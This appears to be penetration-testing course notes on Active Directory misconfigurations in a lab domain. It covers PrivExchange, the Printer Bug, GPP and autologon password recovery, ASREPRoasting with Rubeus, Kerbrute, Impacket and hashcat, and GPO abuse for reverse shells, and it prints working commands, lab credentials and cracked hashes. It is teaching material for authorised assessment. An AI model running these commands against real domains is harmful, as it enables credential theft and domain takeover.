# Table of Contents

- [Miscellaneous Misconfigurations](#miscellaneous-misconfigurations)
  - [Exchange Related Group Membership](#exchange-related-group-membership)
  - [PrivExchange](#privexchange)
  - [Printer Bug](#printer-bug)
  - [MS14-068](#ms14-068)
  - [Sniffing LDAP Credentials](#sniffing-ldap-credentials)
  - [Enumerating DNS Records](#enumerating-dns-records)
- [Other Misconfigurations](#other-misconfigurations)
  - [Password in Description Field](#password-in-description-field)
  - [PASSWD_NOTREQD Field](#passwd_notreqd-field)
  - [Credentials in SMB Shares and SYSVOL Scripts](#credentials-in-smb-shares-and-sysvol-scripts)
  - [Group Policy Preferences (GPP) Passwords](#group-policy-preferences-gpp-passwords)
  - [ASREPRoasting](#asreproasting)
  - [Group Policy Object (GPO) Abuse](#group-policy-object-gpo-abuse)

---

# Miscellaneous Misconfigurations

There are many other attacks and interesting misconfigurations that we may come across during an assessment. A broad understanding of the ins and outs of AD will help us think outside the box and discover issues that others are likely to miss.

---

## Exchange Related Group Membership

A default Microsoft Exchange installation (without split-administration) grants considerable domain privileges, opening multiple attack vectors.

**Exchange Windows Permissions Group:**
* Not a protected group, but members can write DACLs to the domain object
* Can be leveraged to grant DCSync privileges
* Attackers can add accounts via DACL misconfiguration or compromised Account Operators group members
* Commonly contains user accounts and computers
* Often includes power users and remote office support staff with password reset capabilities
* [GitHub repo](https://github.com/gdedrouas/Exchange-AD-Privesc) details privilege escalation techniques

**Organization Management Group:**
* Extremely powerful (equivalent to "Domain Admins" for Exchange)
* Can access all domain user mailboxes
* Sysadmins commonly members
* Has full control over the `Microsoft Exchange Security Groups` OU, which contains `Exchange Windows Permissions`

**Viewing Organization Management's Permissions**
<img width="1026" height="513" alt="image" src="https://github.com/user-attachments/assets/8121aeb9-2cf3-4df6-97aa-0fad1b8f179f" />

If we can compromise an Exchange server, this will often lead to Domain Admin privileges. Additionally, dumping credentials in memory from an Exchange server will produce 10s if not 100s of cleartext credentials or NTLM hashes. This is often due to users logging in to Outlook Web Access (OWA) and Exchange caching their credentials in memory after a successful login.

---

## PrivExchange

A flaw in Exchange Server's `PushSubscription` feature allows any domain user with a mailbox to force the Exchange server to authenticate to any client-specified host over HTTP.

**Why It Works:**
* Exchange service runs as SYSTEM
* Over-privileged by default (has WriteDacl privileges on the domain pre-2019 Cumulative Update)

**Attack Methods:**
* Relay to LDAP → dump domain NTDS database
* If LDAP relay unavailable → relay and authenticate to other domain hosts

**Impact:** Escalates any authenticated domain user account directly to Domain Admin privileges.

---

## Printer Bug

A flaw in the MS-RPRN protocol (Print System Remote Protocol) that defines communication for print job processing and print system management.

**How It Works:**
Any domain user can:
* Connect to the spool's named pipe with `RpcOpenPrinter` method
* Use `RpcRemoteFindFirstPrinterChangeNotificationEx` method
* Force the server to authenticate to any client-specified host over SMB

The spooler service runs as SYSTEM and is installed by default on Windows servers with Desktop Experience.

**Attack Methods:**
* Relay to LDAP → grant DCSync privileges to retrieve all AD password hashes
* Relay LDAP authentication → grant Resource-Based Constrained Delegation (RBCD) privileges, allowing authentication as any user on the victim's computer
* Compromise Domain Controllers in partner domains/forests (requires admin access to first DC and TGT delegation-enabled trust)

**Detection:** Use `Get-SpoolStatus` from `SecurityAssessment.ps1` as preserved in [this](https://github.com/itzvenom/Security-Assessment-PS) repository or [this](https://github.com/NotMedic/NetNTLMtoSilverTicket) tool  or dedicated tools to check for vulnerable machines.

**Use Case:** Compromise hosts with Unconstrained Delegation (like DCs) in another forest to attack across forest trusts.

### Enumerating for MS-PRN Printer Bug
```
PS C:\htb> Import-Module .\SecurityAssessment.ps1
PS C:\htb> Get-SpoolStatus -ComputerName ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL

ComputerName                        Status
------------                        ------
ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL   True
```

---

## MS14-068

A Kerberos protocol flaw allowing privilege escalation from standard domain user credentials to Domain Admin.

**Background:**
Kerberos tickets contain user information (account name, ID, group membership) in the Privilege Attribute Certificate (PAC). The PAC is signed by the KDC using secret keys to prevent tampering.

**The Vulnerability:**
Allowed forged PACs to be accepted as legitimate by the KDC. Attackers can create fake PACs presenting users as members of Domain Administrators or other privileged groups.

**Exploitation Tools:**
* [Python Kerberos Exploitation Kit (PyKEK)](https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS14-068/pykek)
* Impacket toolkit

**Defense:** Patching is the only mitigation.

---

## Sniffing LDAP Credentials

Many applications and printers store LDAP credentials in web admin consoles to connect to the domain. These consoles often have weak or default passwords.

**Credential Retrieval Methods:**

**Direct Access:**
* View credentials in cleartext from the admin console

**Test Connection Exploit:**
* Change LDAP IP address to your attack host
* Set up `netcat` listener on LDAP port 389
* Trigger the "test connection" function
* Device sends credentials to your machine, often in cleartext

**Advanced Method:**
* Some scenarios require a full LDAP server setup (detailed in [this post](https://grimhacker.com/2018/03/09/just-a-printer/))

**Value:** LDAP accounts are often privileged, but even unprivileged accounts can provide initial domain foothold.

---

## Enumerating DNS Records

Use tools like `adidnsdump` to enumerate all DNS records in a domain with a valid domain user account.

**Why It's Useful:**
When enumeration tools like BloodHound return non-descriptive hostnames (e.g., `SRV01934.INLANEFREIGHT.LOCAL`), it's difficult to identify attack targets. DNS records can reveal descriptive names pointing to the same server (e.g., `JENKINS.INLANEFREIGHT.LOCAL`), enabling better attack planning.

**How It Works:**
* By default, all users can list child objects of a DNS zone in AD
* Standard LDAP DNS queries don't return all results
* `adidnsdump` resolves all records in the zone, potentially revealing useful information

**Reference:** Background and detailed explanation available in [this post](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/).

On the first run of the tool, we can see that some records are blank, namely `?,LOGISTICS,?`.

## Using adidnsdump
```
$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 

Password: 

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Querying zone for records
[+] Found 27 records
```

### Viewing the Contents of the records.csv File
```
$ head records.csv 

type,name,value
?,LOGISTICS,?
AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,ForestDnsZones,dead:beef::231
A,ForestDnsZones,10.129.202.29
A,ForestDnsZones,172.16.5.240
A,ForestDnsZones,172.16.5.5
AAAA,DomainDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,DomainDnsZones,dead:beef::231
A,DomainDnsZones,10.129.202.29
```

If we run again with the `-r` flag the tool will attempt to resolve unknown records by performing an `A` query. Now we can see that an IP address of `172.16.5.240` showed up for LOGISTICS. While this is a small example, it is worth running this tool in larger environments. We may uncover "hidden" records that can lead to discovering interesting hosts.

### Using the -r Option to Resolve Unknown Records
```
$ adidnsdump -u inlanefreight\\forend ldap://172.16.5.5 -r

Password: 

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Querying zone for records
[+] Found 27 records
```

### Finding Hidden Records in the records.csv File
```
$ head records.csv 

type,name,value
A,LOGISTICS,172.16.5.240
AAAA,ForestDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,ForestDnsZones,dead:beef::231
A,ForestDnsZones,10.129.202.29
A,ForestDnsZones,172.16.5.240
A,ForestDnsZones,172.16.5.5
AAAA,DomainDnsZones,dead:beef::7442:c49d:e1d7:2691
AAAA,DomainDnsZones,dead:beef::231
A,DomainDnsZones,10.129.202.29
```

---

# Other Misconfigurations

There are many other misconfigurations that can be used to further your access within a domain.

---

## Password in Description Field

Sensitive information such as account passwords are sometimes found in the user account `Description` or `Notes` fields and can be quickly enumerated using PowerView. For large domains, it is helpful to export this data to a CSV file to review offline.

### Finding Passwords in the Description Field using Get-Domain User
```
PS C:\htb> Get-DomainUser * | Select-Object samaccountname,description |Where-Object {$_.Description -ne $null}

samaccountname description
-------------- -----------
administrator  Built-in account for administering the computer/domain
guest          Built-in account for guest access to the computer/domain
krbtgt         Key Distribution Center Service Account
ldap.agent     *** DO NOT CHANGE ***  3/12/2012: Sunsh1ne4All!
```

---

## PASSWD_NOTREQD Field

Domain accounts may have the `passwd_notreqd` field set in the `userAccountControl` attribute, exempting them from current password policy length requirements.

**What It Means:**
* User could have a shorter password or no password at all (if empty passwords are allowed)
* Flag doesn't guarantee no password exists—just that one may not be required

**Common Causes:**
* Intentional blank passwords (admins avoiding after-hours password reset calls)
* Accidental—hitting enter before entering password during command-line changes
* Vendor products setting this flag during installation and never removing it

**Recommendation:**
* Enumerate accounts with this flag
* Test each for blank passwords (observed in real assessments)
* Include findings in comprehensive client reports

### Checking for PASSWD_NOTREQD Setting using Get-DomainUser
```
PS C:\htb> Get-DomainUser -UACFilter PASSWD_NOTREQD | Select-Object samaccountname,useraccountcontrol

samaccountname                                                         useraccountcontrol
--------------                                                         ------------------
guest                ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
mlowe                                PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
ehamilton                            PASSWD_NOTREQD, NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
$725000-9jb50uejje9f                       ACCOUNTDISABLE, PASSWD_NOTREQD, NORMAL_ACCOUNT
nagiosagent                                                PASSWD_NOTREQD, NORMAL_ACCOUNT
```

---

## Credentials in SMB Shares and SYSVOL Scripts

The SYSVOL share can contain valuable data, especially in large organizations. The scripts directory is readable by all authenticated domain users and may contain batch, VBScript, and PowerShell scripts with embedded passwords.

**What to Look For:**
* Password-containing scripts in the scripts directory
* Old scripts with disabled accounts or outdated passwords
* Occasionally, active credentials ("striking gold")

**Example:** A script named `reset_local_admin_pass.vbs` would be worth investigating for credentials.

**Recommendation:** Always thoroughly examine the SYSVOL scripts directory during enumeration.

### Discovering an Interesting Script
```
PS C:\htb> ls \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts

    Directory: \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts


Mode                LastWriteTime         Length Name                                                                 
----                -------------         ------ ----                                                                 
-a----       11/18/2021  10:44 AM            174 daily-runs.zip                                                       
-a----        2/28/2022   9:11 PM            203 disable-nbtns.ps1                                                    
-a----         3/7/2022   9:41 AM         144138 Logon Banner.htm                                                     
-a----         3/8/2022   2:56 PM            979 reset_local_admin_pass.vbs
```

Taking a closer look at the script, we see that it contains a password for the built-in local administrator on Windows hosts. In this case, it would be worth checking to see if this password is still set on any hosts in the domain. We could do this using CrackMapExec and the `--local-auth` flag for Password Spraying.

### Finding a Password in the Script
```
PS C:\htb> cat \\academy-ea-dc01\SYSVOL\INLANEFREIGHT.LOCAL\scripts\reset_local_admin_pass.vbs

On Error Resume Next
strComputer = "."
 
Set oShell = CreateObject("WScript.Shell") 
sUser = "Administrator"
sPwd = "!ILFREIGHT_L0cALADmin!"
 
Set Arg = WScript.Arguments
If  Arg.Count > 0 Then
sPwd = Arg(0) 'Pass the password as parameter to the script
End if
 
'Get the administrator name
Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")

<SNIP>
```

---

## Group Policy Preferences (GPP) Passwords

When GPPs are created, `.xml` files are stored in the SYSVOL share and cached locally on affected endpoints. These files can be used to:
* Map drives (drives.xml)
* Create local users
* Configure printers (printers.xml)
* Create/update services (services.xml)
* Create scheduled tasks (scheduledtasks.xml)
* Change local admin passwords

**The Vulnerability:**
* Files contain configuration data and passwords
* `cpassword` attribute is AES-256 encrypted, but Microsoft published the decryption key on MSDN
* All authenticated domain users can read SYSVOL by default

**Patch Status:**
* MS14-025 (2014) prevents setting passwords via GPP
* Does NOT remove existing Groups.xml files with passwords from SYSVOL
* Deleting GPP policy (vs. unlinking) leaves cached copies on local computers

**Impact:** Any domain user can decrypt stored passwords.

The XML looks like the following:

**Viewing Groups.xml**
<img width="1252" height="188" alt="image" src="https://github.com/user-attachments/assets/42f77bb3-78db-4884-9485-bce7048cec60" />

If you retrieve the cpassword value more manually, the `gpp-decrypt` utility can be used to decrypt the password as follows:

### Decrypting the Password with gpp-decrypt
```
$ gpp-decrypt VPe/o9YRyz2cksnYRbNeQj35w9KxQ5ttbvtRaAVqxaE

Password1
```

**Locating and Exploiting GPP Passwords**

**Enumeration Methods:**
* Manual browsing of SYSVOL share
* **Tools:**
  * [Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)
  * GPP Metasploit Post Module
  * Python/Ruby scripts
  * CrackMapExec (has two GPP modules)

**Engagement Tip:**
GPP passwords often belong to legacy, locked, or deleted accounts. However:
* Attempt internal password spraying with retrieved passwords (especially unique ones)
* Password reuse is widespread
* GPP password + password spraying can lead to additional access

### Locating & Retrieving GPP Passwords with CrackMapExec

```
$ crackmapexec smb -L | grep gpp

[*] gpp_autologin             Searches the domain controller for registry.xml to find autologon information and returns the username and password.
[*] gpp_password              Retrieves the plaintext password and other information for accounts pushed through Group Policy Preferences.
```

**Registry.xml Autologon Credentials**

Passwords can be found in `Registry.xml` when autologon is configured via Group Policy (for machines set to automatically log in at boot).

**Key Differences from GPP Passwords:**
* Credentials stored in **cleartext** on SYSVOL
* Microsoft has **not** patched this issue
* Readable by any authenticated domain user

**Important:** This only applies when autologon is configured via Group Policy, not locally on individual hosts.

**Enumeration Tools:**
* CrackMapExec: `gpp_autologin` module
* PowerSploit: `Get-GPPAutologon.ps1` [script](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1)

### Using CrackMapExec's gpp_autologin Module

```
$ crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M gpp_autologin

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\forend:Klmcargo2 
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found SYSVOL share
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Searching for Registry.xml
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [*] Found INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  [+] Found credentials in INLANEFREIGHT.LOCAL/Policies/{CAEBB51E-92FD-431D-8DBE-F9312DB5617D}/Machine/Preferences/Registry/Registry.xml
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Usernames: ['guarddesk']
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Domains: ['INLANEFREIGHT.LOCAL']
GPP_AUTO... 172.16.5.5      445    ACADEMY-EA-DC01  Passwords: ['ILFreightguardadmin!']
```

In the output above, we can see that we have retrieved the credentials for an account called `guarddesk`. This may have been set up so that shared workstations used by guards automatically log in at boot to accommodate multiple users throughout the day and night working different shifts. In this case, the credentials are likely a local admin, so it would be worth finding hosts where we can log in as an admin and hunt for additional data. Sometimes we may discover credentials for a highly privileged user or credentials for a disabled account/an expired password that is no use to us.

A theme that we touch on throughout this module is password re-use. Poor password hygiene is common in many organizations, so whenever we obtain credentials, we should check to see if we can use them to access other hosts (as a domain or local user), leverage any rights such as interesting ACLs, access shares, or use the password in a password spraying attack to uncover password re-use and maybe an account that grants us further access towards our goal.

---

## ASREPRoasting

Obtain the Ticket Granting Ticket (TGT) for accounts with [Do not require Kerberos pre-authentication](https://www.tenable.com/blog/how-to-stop-the-kerberos-pre-authentication-attack-in-active-directory) enabled (commonly specified in vendor installation guides for service accounts).

**How Kerberos Pre-Authentication Works:**
* User enters password, which encrypts a timestamp
* Domain Controller decrypts to validate the password
* If successful, TGT is issued for further domain authentication

**The Vulnerability:**
When pre-authentication is disabled:
* Attackers can request authentication data for the account
* Retrieve an encrypted TGT from the Domain Controller (encrypted with account's password)
* The AS_REP (authentication service reply) can be requested by any domain user

**Exploitation:**
* Perform offline password attack on the encrypted TGT
* Use tools like Hashcat or John the Ripper to crack the password

**Viewing an Account with the Do not Require Kerberos Preauthentication Option**
<img width="1113" height="527" alt="image" src="https://github.com/user-attachments/assets/b235b8c2-01b1-4b47-ab67-d2eb5dbbfb72" />

Similar to Kerberoasting but targets the AS-REP instead of TGS-REP. **No SPN required.**

**Enumeration:**
* PowerView
* PowerShell AD module

**Exploitation:**
* Use Rubeus toolkit or similar tools to obtain the target account's ticket
* Perform offline cracking to recover the password

**Privilege Escalation Path:**
If an attacker has `GenericWrite` or `GenericAll` permissions over an account:
1. Enable the "Do not require pre-authentication" attribute
2. Obtain the AS-REP ticket
3. Crack it offline
4. Disable the attribute again

**Success Factor:** Like Kerberoasting, effectiveness depends on the account having a relatively weak password.

Below is an example of the attack. PowerView can be used to enumerate users with their UAC value set to `DONT_REQ_PREAUTH`.

### Enumerating for DONT_REQ_PREAUTH Value using Get-DomainUser
```
PS C:\htb> Get-DomainUser -PreauthNotRequired | select samaccountname,userprincipalname,useraccountcontrol | fl

samaccountname     : mmorgan
userprincipalname  : mmorgan@inlanefreight.local
useraccountcontrol : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD, DONT_REQ_PREAUTH
```

With this information in hand, the Rubeus tool can be leveraged to retrieve the AS-REP in the proper format for offline hash cracking. This attack does not require any domain user context and can be done by just knowing the SAM name for the user without Kerberos pre-auth. We will see an example of this using Kerbrute later in this section. 

Remember, add the `/nowrap` flag so the ticket is not column wrapped and is retrieved in a format that we can readily feed into Hashcat.

### Retrieving AS-REP in Proper Format using Rubeus

```
PS C:\htb> .\Rubeus.exe asreproast /user:mmorgan /nowrap /format:hashcat

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: AS-REP roasting

[*] Target User            : mmorgan
[*] Target Domain          : INLANEFREIGHT.LOCAL

[*] Searching path 'LDAP://ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304)(samAccountName=mmorgan))'
[*] SamAccountName         : mmorgan
[*] DistinguishedName      : CN=Matthew Morgan,OU=Server Admin,OU=IT,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
[*] Using domain controller: ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL (172.16.5.5)
[*] Building AS-REQ (w/o preauth) for: 'INLANEFREIGHT.LOCAL\mmorgan'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:
     $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:D18650F4F4E0537E0188A6897A478C55$0978822DEC13046712DB7DC03F6C4DE059A9464854...<SNIP>...
```

We can then crack the hash offline using Hashcat with mode `18200`.

### Cracking the Hash Offline with Hashcat

```
$ hashcat -m 18200 ilfreight_asrep /usr/share/wordlists/rockyou.txt 

hashcat (v6.1.1) starting...

<SNIP>

$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:d18650f4f4e0537e0188a6897a478c55$0978822dec13046712db7dc03f6c...<SNIP>...8b25c6ca:Welcome!00
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
Hash.Target......: $krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:d18650f4f...25c6ca
Time.Started.....: Fri Apr  1 13:18:40 2022 (14 secs)
Time.Estimated...: Fri Apr  1 13:18:54 2022 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   782.4 kH/s (4.95ms) @ Accel:32 Loops:1 Thr:64 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 10506240/14344385 (73.24%)
Rejected.........: 0/10506240 (0.00%)
Restore.Point....: 10493952/14344385 (73.16%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: WellHelloNow -> W14233LTKM

Started: Fri Apr  1 13:18:37 2022
Stopped: Fri Apr  1 13:18:55 2022
```

When performing user enumeration with `Kerbrute`, the tool will automatically retrieve the AS-REP for any users found that do not require Kerberos pre-authentication.

### Retrieving the AS-REP Using Kerbrute
```
$ kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 04/01/22 - Ronnie Flathers @ropnop

2022/04/01 13:14:17 >  Using KDC(s):
2022/04/01 13:14:17 >  	172.16.5.5:88

2022/04/01 13:14:17 >  [+] VALID USERNAME:	 sbrown@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 jjones@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 dlewis@inlanefreight.local
2022/04/01 13:14:17 >  [+] VALID USERNAME:	 ccruz@inlanefreight.local
2022/04/01 13:14:17 >  [+] mmorgan has no pre auth required. Dumping hash to crack offline:
$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:400d306dda575be3d429aad3...<SNIP>...6ca7af52ac4453e6a

<SNIP>
```

With a list of valid users, we can use [Get-NPUsers.py](https://github.com/fortra/impacket/blob/master/examples/GetNPUsers.py) from the Impacket toolkit to hunt for all users with Kerberos pre-authentication not required. The tool will retrieve the AS-REP in Hashcat format for offline cracking for any found. We can also feed a wordlist such as `jsmith.txt` into the tool, it will throw errors for users that do not exist, but if it finds any valid ones without Kerberos pre-authentication, then it can be a nice way to obtain a foothold or further our access, depending on where we are in the course of our assessment.

### Hunting for Users with Kerberos Pre-auth Not Required
```
$ GetNPUsers.py INLANEFREIGHT.LOCAL/ -dc-ip 172.16.5.5 -no-pass -usersfile valid_ad_users 
Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation

[-] User sbrown@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jjones@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tjohnson@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jwilson@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User bdavis@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User njohnson@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User asanchez@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User dlewis@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User ccruz@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$mmorgan@inlanefreight.local@INLANEFREIGHT.LOCAL:47e0d517f2a5815da8345dd9247a0e3d$b62d45bc3c0f4c306402a205ebdbbc623d77a...<SNIP>...8bba9
[-] User rramirez@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jwallace@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User jsantiago@inlanefreight.local doesn't have UF_DONT_REQUIRE_PREAUTH set

<SNIP>
```

---

## Group Policy Object (GPO) Abuse

Group Policy enables administrators to apply advanced settings to user and computer objects for hardening AD environments. However, attackers can abuse GPOs via ACL misconfigurations for lateral movement, privilege escalation, domain compromise, and persistence.

**Attack Methods:**
* Add user rights (SeDebugPrivilege, SeTakeOwnershipPrivilege, SeImpersonatePrivilege)
* Add local admin users to hosts
* Create immediate scheduled tasks for various actions

**Enumeration Tools:**
* PowerView
* BloodHound
* group3r
* ADRecon
* PingCastle

Using the Get-DomainGPO function from PowerView, we can get a listing of GPOs by name.

### Enumerating GPO Names with PowerView
```
PS C:\htb> Get-DomainGPO |select displayname

displayname
-----------
Default Domain Policy
Default Domain Controllers Policy
Deny Control Panel Access
Disallow LM Hash
Deny CMD Access
Disable Forced Restarts
Block Removable Media
Disable Guest Account
Service Accounts Password Policy
Logon Banner
Disconnect Idle RDP
Disable NetBIOS
AutoLogon
GuardAutoLogon
Certificate Services
```

This can be helpful for us to begin to see what types of security measures are in place (such as denying cmd.exe access and a separate password policy for service accounts). We can see that autologon is in use which may mean there is a readable password in a GPO, and see that Active Directory Certificate Services (AD CS) is present in the domain. If Group Policy Management Tools are installed on the host we are working from, we can use various built-in GroupPolicy cmdlets such as `Get-GPO` to perform the same enumeration.

### Enumerating GPO Names with a Built-In Cmdlet
```
PS C:\htb> Get-GPO -All | Select DisplayName

DisplayName
-----------
Certificate Services
Default Domain Policy
Disable NetBIOS
Disable Guest Account
AutoLogon
Default Domain Controllers Policy
Disconnect Idle RDP
Disallow LM Hash
Deny CMD Access
Block Removable Media
GuardAutoLogon
Service Accounts Password Policy
Logon Banner
Disable Forced Restarts
Deny Control Panel Access
```

Next, we can check if a user we can control has any rights over a GPO. Specific users or groups may be granted rights to administer one or more GPOs. A good first check is to see if the entire Domain Users group has any rights over one or more GPOs.

### Enumerating Domain User GPO Rights

```
PS C:\htb> $sid=Convert-NameToSid "Domain Users"
PS C:\htb> Get-DomainGPO | Get-ObjectAcl | ?{$_.SecurityIdentifier -eq $sid}

ObjectDN              : CN={7CA9C789-14CE-46E3-A722-83F4097AF532},CN=Policies,CN=System,DC=INLANEFREIGHT,DC=LOCAL
ObjectSID             :
ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, Delete, GenericExecute, WriteDacl,
                        WriteOwner
BinaryLength          : 36
AceQualifier          : AccessAllowed
IsCallback            : False
OpaqueLength          : 0
AccessMask            : 983095
SecurityIdentifier    : S-1-5-21-3842939050-3880317879-2865463114-513
AceType               : AccessAllowed
AceFlags              : ObjectInherit, ContainerInherit
IsInherited           : False
InheritanceFlags      : ContainerInherit, ObjectInherit
PropagationFlags      : None
AuditFlags            : None
```

Here we can see that the Domain Users group has various permissions over a GPO, such as `WriteProperty` and `WriteDacl`, which we could leverage to give ourselves full control over the GPO and pull off any number of attacks that would be pushed down to any users and computers in OUs that the GPO is applied to. We can use the GPO GUID combined with `Get-GPO` to see the display name of the GPO.

### Converting GPO GUID to Name

```
PS C:\htb Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532

DisplayName      : Disconnect Idle RDP
DomainName       : INLANEFREIGHT.LOCAL
Owner            : INLANEFREIGHT\Domain Admins
Id               : 7ca9c789-14ce-46e3-a722-83f4097af532
GpoStatus        : AllSettingsEnabled
Description      :
CreationTime     : 10/28/2021 3:34:07 PM
ModificationTime : 4/5/2022 6:54:25 PM
UserVersion      : AD Version: 0, SysVol Version: 0
ComputerVersion  : AD Version: 0, SysVol Version: 0
WmiFilter        :
```

Checking in BloodHound, we can see that the `Domain Users` group has several rights over the `Disconnect Idle RDP` GPO, which could be leveraged for full control of the object.

<img width="1052" height="262" alt="image" src="https://github.com/user-attachments/assets/a43ba970-02ad-45ab-9a46-687fc91a02ce" />

If we select the GPO in BloodHound and scroll down to `Affected Objects` on the `Node Info` tab, we can see that this GPO is applied to one OU, which contains four computer objects.

<img width="1322" height="655" alt="image" src="https://github.com/user-attachments/assets/f7f6cb66-8e7e-47f2-9a48-9691b05fdef1" />

We could use a tool such as [SharpGPOAbuse](https://github.com/FSecureLABS/SharpGPOAbuse) to take advantage of this GPO misconfiguration by performing actions such as adding a user that we control to the local admins group on one of the affected hosts, creating an immediate scheduled task on one of the hosts to give us a reverse shell, or configure a malicious computer startup script to provide us with a reverse shell or similar. When using a tool like this, we need to be careful because commands can be run that affect every computer within the OU that the GPO is linked to. If we found an editable GPO that applies to an OU with 1,000 computers, we would **not** want to make the mistake of adding ourselves as a local admin to that many hosts. Some of the attack options available with this tool allow us to specify a target user or host. 

